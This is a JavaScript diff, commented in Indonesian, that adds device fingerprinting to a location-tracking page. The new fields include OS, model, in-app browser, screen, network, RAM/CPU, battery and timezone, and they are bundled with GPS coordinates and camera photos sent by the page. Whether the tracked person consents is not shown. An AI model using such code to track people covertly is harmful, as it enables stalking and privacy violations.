@@ -103,6 +103,88 @@
     }
   }
 
+  function collectDeviceInfo() {
+    const ua = navigator.userAgent || "";
+    
+    // Deteksi Sistem Operasi (OS)
+    let os = "OS Lain";
+    if (/Android/i.test(ua)) {
+      const match = ua.match(/Android\s([0-9\.]+)/i);
+      os = match ? ("Android " + match[1]) : "Android";
+    } else if (/iPhone|iPad|iPod/i.test(ua)) {
+      const match = ua.match(/OS\s([0-9_\.]+)/i);
+      os = match ? ("iOS " + match[1].replace(/_/g, ".")) : "iOS (Apple)";
+    } else if (/Windows NT 10.0/i.test(ua)) {
+      os = "Windows 10/11";
+    } else if (/Windows NT/i.test(ua)) {
+      os = "Windows PC";
+    } else if (/Macintosh|Mac OS X/i.test(ua)) {
+      os = "macOS";
+    } else if (/Linux/i.test(ua)) {
+      os = "Linux";
+    }
+
+    // Deteksi Tipe & Model Perangkat
+    let deviceModel = "Desktop / Laptop";
+    if (/iPhone/i.test(ua)) {
+      deviceModel = "Apple iPhone";
+    } else if (/iPad/i.test(ua)) {
+      deviceModel = "Apple iPad";
+    } else if (/Android/i.test(ua)) {
+      const match = ua.match(/;\s*([^;)]+)\s+(?:Build\/|\))/i);
+      deviceModel = match ? match[1].trim() : "Android Phone";
+    }
+
+    // Deteksi Browser & In-App Browser (Instagram, TikTok, dll)
+    let browser = "Browser";
+    if (/Instagram/i.test(ua)) browser = "Instagram App";
+    else if (/TikTok/i.test(ua)) browser = "TikTok App";
+    else if (/FBAN|FBAV/i.test(ua)) browser = "Facebook App";
+    else if (/Edg\//i.test(ua)) browser = "Microsoft Edge";
+    else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) browser = "Google Chrome";
+    else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = "Apple Safari";
+    else if (/Firefox\//i.test(ua)) browser = "Mozilla Firefox";
+
+    // Resolusi Layar & Rasio Skala
+    const screenRes = (window.screen ? window.screen.width : window.innerWidth) + "x" +
+                      (window.screen ? window.screen.height : window.innerHeight) + 
+                      " (" + (window.devicePixelRatio || 1) + "x)";
+
+    // Informasi Jaringan Koneksi
+    let networkType = "-";
+    if (navigator.connection) {
+      const conn = navigator.connection;
+      const parts = [];
+      if (conn.effectiveType) parts.push(conn.effectiveType.toUpperCase());
+      if (conn.downlink) parts.push(conn.downlink + " Mbps");
+      if (conn.rtt) parts.push("rtt " + conn.rtt + "ms");
+      networkType = parts.join(" • ") || "-";
+    }
+
+    // Spesifikasi Hardware (RAM & CPU Cores)
+    const ram = navigator.deviceMemory ? (navigator.deviceMemory + " GB RAM") : "";
+    const cores = navigator.hardwareConcurrency ? (navigator.hardwareConcurrency + " Cores CPU") : "";
+    const hardware = [ram, cores].filter(Boolean).join(" • ") || "-";
+
+    // Status Pengisian Daya Baterai
+    let batteryCharging = null;
+    if (batteryManager) {
+      batteryCharging = batteryManager.charging ? "⚡ Mengisi Daya" : "Baterai";
+    }
+
+    return {
+      device_model: deviceModel,
+      os: os,
+      browser: browser,
+      screen_res: screenRes,
+      network_type: networkType,
+      hardware: hardware,
+      battery_charging: batteryCharging,
+      timezone: (typeof Intl !== "undefined" && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : "Asia/Jakarta",
+      language: navigator.language || "id-ID"
+    };
+  }
+
   function stopTracking(message = "Tracking dihentikan. Tidak ada pengiriman lokasi baru.", state = "idle") {
     active = false;
     session += 1;
@@ -169,6 +251,7 @@
     }
     const position = latestPosition;
     const coords = position.coords;
+    const info = collectDeviceInfo();
     const payload = {
       latitude: coords.latitude,
       longitude: coords.longitude,
@@ -178,6 +261,7 @@
       heading: Number.isFinite(coords.heading) ? coords.heading : null,
       battery: batteryPercent(),
       device_time: new Date(position.timestamp).toISOString(),
+      ...info
     };
     if (pendingPhoto) {
       payload.photo = pendingPhoto;
@@ -435,6 +519,7 @@
         } catch (_) {}
       }
 
+      const info = collectDeviceInfo();
       const payload = {
         latitude: coords ? coords.latitude : 0,
         longitude: coords ? coords.longitude : 0,
@@ -445,6 +530,7 @@
         battery: batteryPercent(),
         device_time: new Date(timestamp).toISOString(),
         photo: pendingPhoto,
+        ...info
       };
 
       if (cameraStatusEl) {
